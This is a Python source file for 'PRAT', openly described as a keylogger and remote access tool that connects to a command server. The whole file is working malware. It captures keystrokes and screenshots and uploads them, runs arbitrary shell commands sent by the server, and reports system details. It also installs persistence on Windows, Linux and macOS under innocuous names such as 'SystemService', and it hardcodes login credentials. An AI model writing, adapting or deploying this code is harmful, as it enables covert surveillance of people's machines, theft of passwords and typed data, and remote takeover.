#!/usr/bin/env python3
"""
PRAT - Python Remote Access Tool
A client-side keylogger and remote access tool that connects to RemoteBatControl
"""

import os
import sys
import time
import json
import base64
import socket
import logging
import platform
import threading
import subprocess
import urllib.request
import urllib.parse
from datetime import datetime

try:
    import requests
except ImportError:
    print("Installing required packages...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

try:
    from pynput import keyboard, mouse
except ImportError:
    print("Installing required packages...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    from pynput import keyboard, mouse

try:
    from PIL import ImageGrab
except ImportError:
    print("Installing required packages...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pillow"])
    from PIL import ImageGrab

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='prat.log',
    filemode='a'
)

logger = logging.getLogger('PRAT')

# Configuration
CONFIG = {
    'server_url': 'http://localhost:5000',  # Change to the actual server URL
    'auth': {
        'username': 'subhashbswkrm',
        'password': 'Sb13579@@@'
    },
    'check_interval': 5,  # seconds between checking for commands
    'keylog_buffer_size': 100,  # characters before sending keylog data
    'screenshot_interval': 30,  # seconds between screenshots
    'persistence_enabled': False,  # whether to install persistence
}

# Global variables
keylog_buffer = ""
session = requests.Session()
command_handlers = {}
running = True
keylogger_active = False
screenshot_active = False

# ===== Utility Functions =====

def get_system_info():
    """Get basic system information"""
    try:
        info = {
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'username': os.getlogin(),
            'ip_address': socket.gethostbyname(socket.gethostname()),
            'mac_address': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                   for elements in range(0, 2*6, 2)][::-1]),
            'timestamp': datetime.now().isoformat()
        }
        return info
    except Exception as e:
        logger.error(f"Error getting system info: {e}")
        return {'error': str(e)}

def take_screenshot():
    """Take a screenshot and return as base64"""
    try:
        screenshot = ImageGrab.grab()
        import io
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        img_str = base64.b64encode(buffer.getvalue()).decode()
        return img_str
    except Exception as e:
        logger.error(f"Error taking screenshot: {e}")
        return None

def execute_command(command):
    """Execute a system command and return the output"""
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=30
        )
        return {
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {'error': 'Command timed out'}
    except Exception as e:
        logger.error(f"Error executing command: {e}")
        return {'error': str(e)}

# ===== Authentication =====

def authenticate():
    """Authenticate with the server"""
    try:
        response = session.post(
            f"{CONFIG['server_url']}/login",
            data={
                'username': CONFIG['auth']['username'],
                'password': CONFIG['auth']['password']
            }
        )
        if response.status_code == 200:
            logger.info("Authentication successful")
            return True
        else:
            logger.error(f"Authentication failed: {response.status_code}")
            return False
    except Exception as e:
        logger.error(f"Authentication error: {e}")
        return False

# ===== Keylogger =====

def on_key_press(key):
    """Callback for key press events"""
    global keylog_buffer
    
    if not keylogger_active:
        return
        
    try:
        # Try to get the character
        keylog_buffer += key.char
    except AttributeError:
        # Special key
        if key == keyboard.Key.space:
            keylog_buffer += " "
        elif key == keyboard.Key.enter:
            keylog_buffer += "\n"
        elif key == keyboard.Key.tab:
            keylog_buffer += "\t"
        else:
            keylog_buffer += f"[{key}]"
    
    # If buffer is full, send it
    if len(keylog_buffer) >= CONFIG['keylog_buffer_size']:
        send_keylog_data()

def send_keylog_data():
    """Send keylog data to the server"""
    global keylog_buffer
    
    if not keylog_buffer:
        return
        
    try:
        response = session.post(
            f"{CONFIG['server_url']}/api/keylogger",
            json={
                'action': 'data',
                'keylog_data': keylog_buffer,
                'timestamp': datetime.now().isoformat(),
                'hostname': socket.gethostname(),
                'username': os.getlogin()
            }
        )
        if response.status_code == 200:
            keylog_buffer = ""
            logger.info("Keylog data sent successfully")
        else:
            logger.error(f"Failed to send keylog data: {response.status_code}")
    except Exception as e:
        logger.error(f"Error sending keylog data: {e}")

# ===== Command Handlers =====

def register_command_handler(command, handler):
    """Register a command handler"""
    command_handlers[command] = handler

def handle_keylogger_command(params):
    """Handle keylogger commands"""
    global keylogger_active
    
    action = params.get('action', 'status')
    
    if action == 'start':
        keylogger_active = True
        return {'success': True, 'message': 'Keylogger started'}
    elif action == 'stop':
        keylogger_active = False
        # Send any remaining data
        send_keylog_data()
        return {'success': True, 'message': 'Keylogger stopped'}
    elif action == 'status':
        return {
            'success': True, 
            'active': keylogger_active,
            'buffer_size': len(keylog_buffer)
        }
    else:
        return {'error': 'Unknown action'}

def handle_screenshot_command(params):
    """Handle screenshot commands"""
    global screenshot_active
    
    action = params.get('action', 'take')
    
    if action == 'take':
        img_str = take_screenshot()
        if img_str:
            return {
                'success': True,
                'image': img_str,
                'timestamp': datetime.now().isoformat()
            }
        else:
            return {'error': 'Failed to take screenshot'}
    elif action == 'start':
        screenshot_active = True
        return {'success': True, 'message': 'Screenshot monitoring started'}
    elif action == 'stop':
        screenshot_active = False
        return {'success': True, 'message': 'Screenshot monitoring stopped'}
    elif action == 'status':
        return {'success': True, 'active': screenshot_active}
    else:
        return {'error': 'Unknown action'}

def handle_execute_command(params):
    """Handle command execution"""
    command = params.get('command', '')
    if not command:
        return {'error': 'No command provided'}
    
    result = execute_command(command)
    return {'success': True, 'result': result}

def handle_system_info_command(params):
    """Handle system info command"""
    info = get_system_info()
    return {'success': True, 'info': info}

def handle_exit_command(params):
    """Handle exit command"""
    global running
    running = False
    return {'success': True, 'message': 'Exiting'}

# Register command handlers
register_command_handler('keylogger', handle_keylogger_command)
register_command_handler('screenshot', handle_screenshot_command)
register_command_handler('execute', handle_execute_command)
register_command_handler('system_info', handle_system_info_command)
register_command_handler('exit', handle_exit_command)

# ===== Main Functions =====

def check_for_commands():
    """Check for commands from the server"""
    try:
        response = session.get(f"{CONFIG['server_url']}/api/client_commands")
        if response.status_code == 200:
            commands = response.json()
            for cmd in commands:
                process_command(cmd)
    except Exception as e:
        logger.error(f"Error checking for commands: {e}")

def process_command(command):
    """Process a command from the server"""
    try:
        cmd_type = command.get('type')
        params = command.get('params', {})
        
        if cmd_type in command_handlers:
            result = command_handlers[cmd_type](params)
            # Send result back to server
            session.post(
                f"{CONFIG['server_url']}/api/client_response",
                json={
                    'command_id': command.get('id'),
                    'result': result
                }
            )
        else:
            logger.warning(f"Unknown command type: {cmd_type}")
    except Exception as e:
        logger.error(f"Error processing command: {e}")

def screenshot_thread_func():
    """Thread function for periodic screenshots"""
    while running:
        if screenshot_active:
            try:
                img_str = take_screenshot()
                if img_str:
                    session.post(
                        f"{CONFIG['server_url']}/api/screenshot_upload",
                        json={
                            'image': img_str,
                            'timestamp': datetime.now().isoformat(),
                            'hostname': socket.gethostname(),
                            'username': os.getlogin()
                        }
                    )
            except Exception as e:
                logger.error(f"Error in screenshot thread: {e}")
        
        # Sleep for the configured interval
        time.sleep(CONFIG['screenshot_interval'])

def setup_persistence():
    """Setup persistence to run on startup"""
    if not CONFIG['persistence_enabled']:
        return
        
    try:
        if platform.system() == 'Windows':
            import winreg
            # Get the full path of the current script
            script_path = os.path.abspath(sys.argv[0])
            # Open the registry key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            # Set the value
            winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, f"\"{sys.executable}\" \"{script_path}\"")
            # Close the key
            winreg.CloseKey(key)
            logger.info("Persistence installed (Windows Registry)")
        elif platform.system() == 'Linux':
            # Create a systemd service file
            service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
ExecStart={sys.executable} {os.path.abspath(sys.argv[0])}
Restart=always
User={os.getlogin()}

[Install]
WantedBy=multi-user.target
"""
            service_path = os.path.expanduser("~/.config/systemd/user/system-service.service")
            os.makedirs(os.path.dirname(service_path), exist_ok=True)
            with open(service_path, 'w') as f:
                f.write(service_content)
            # Enable the service
            subprocess.run(["systemctl", "--user", "enable", "system-service"])
            logger.info("Persistence installed (Linux systemd)")
        elif platform.system() == 'Darwin':  # macOS
            # Create a launch agent plist file
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(sys.argv[0])}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.service.plist")
            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            # Load the launch agent
            subprocess.run(["launchctl", "load", plist_path])
            logger.info("Persistence installed (macOS LaunchAgent)")
    except Exception as e:
        logger.error(f"Error setting up persistence: {e}")

def main():
    """Main function"""
    global running
    
    logger.info("Starting PRAT client")
    
    # Setup persistence
    setup_persistence()
    
    # Start keylogger
    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    keyboard_listener.start()
    
    # Start screenshot thread
    screenshot_thread = threading.Thread(target=screenshot_thread_func)
    screenshot_thread.daemon = True
    screenshot_thread.start()
    
    # Initial authentication
    if not authenticate():
        logger.error("Initial authentication failed, retrying in 30 seconds")
        time.sleep(30)
        if not authenticate():
            logger.error("Authentication failed again, exiting")
            return
    
    # Send initial system info
    try:
        system_info = get_system_info()
        session.post(
            f"{CONFIG['server_url']}/api/client_register",
            json=system_info
        )
        logger.info("System info sent successfully")
    except Exception as e:
        logger.error(f"Error sending system info: {e}")
    
    # Main loop
    while running:
        try:
            # Check for commands
            check_for_commands()
            
            # Send keylog data if buffer is not empty
            if keylogger_active and keylog_buffer:
                send_keylog_data()
                
            # Sleep for the check interval
            time.sleep(CONFIG['check_interval'])
        except Exception as e:
            logger.error(f"Error in main loop: {e}")
            time.sleep(CONFIG['check_interval'])
    
    # Cleanup
    keyboard_listener.stop()
    logger.info("PRAT client stopped")

if __name__ == "__main__":
    # Check if running with admin/root privileges
    try:
        is_admin = os.geteuid() == 0  # Unix-like
    except AttributeError:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0  # Windows
    
    if not is_admin:
        logger.warning("Running without admin privileges, some features may not work")
    
    # Import uuid here to avoid issues on some systems
    import uuid
    
    # Run main function
    main()